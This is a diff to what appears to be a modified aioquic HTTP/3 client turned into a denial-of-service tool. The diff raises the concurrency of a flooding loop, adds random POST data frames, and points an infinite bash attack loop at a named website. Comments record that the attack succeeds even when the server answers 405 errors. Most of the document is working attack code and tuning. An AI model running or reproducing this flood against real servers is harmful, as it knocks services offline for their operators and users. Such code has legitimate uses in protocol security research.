@@ -29,7 +29,6 @@ import aioquic.tls as tls
 from aioquic.quic.connection import *
 import concurrent.futures
 
-logger = logging.getLogger("client")
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
 sock.settimeout(0.1)
 
@@ -770,18 +769,22 @@ class HttpClient():
 
 """ 
 Original attack:
-while true
-do
-    echo "\e[0;31mInitiate attack\e[0m"
-    #Or seq 1 100 | timeout 5s xargs -n1 -P100
-    sudo seq 1 30 | timeout 1s xargs -n1 -P30 python3 examples/http3_client.py --zero-rtt URL 
-    echo "\e[0;32mSleep...\e[0m"
-    sleep 30;
-done
+    while true
+    do
+        echo "\e[0;31mInitiate attack\e[0m"
+        #Generate random hex data
+        x=$(openssl rand -hex 32)
+        sudo seq 1 40 | timeout 5s xargs -n1 -P40 python3 ../../http3_client.py -k -d $x https://prett3.com/wiki.html
+        echo "\e[0;32mSleep...\e[0m"
+        sleep 5;
+    done
 """
 
 """
-
+1. Although we use POST request, the requested file should still be huge.
+2. It doesn't matter if the file accepts POST request or not. We can send the data to an html file.
+   We will get 405 Method Not Allowed error, but the attack will work.
+3. The transfered data can be smaller than 32 bytes. We did 10 bytes.
 """
 def main(
     configuration: QuicConfiguration,
@@ -804,7 +807,9 @@ def main(
         h3client.read_from_buffer()  # Receive any response from the server
 
         headers_data = h3client.craft_sample_headers_frame()
+        data = h3client.craft_sample_data_frame()
         h3client.send_quic_stream(headers_data)
+        h3client.send_quic_stream(data)
         h3client.read_from_buffer()
 
     #background_task()
@@ -812,10 +817,10 @@ def main(
     with concurrent.futures.ThreadPoolExecutor() as executor:
         futures = []
         while True:
-            for i in range(30):
+            for i in range(40):
                 # Submit each iteration as a separate task
                 futures.append(executor.submit(background_task))
-            time.sleep(30)
+            time.sleep(5)
 
 
 if __name__ == "__main__":
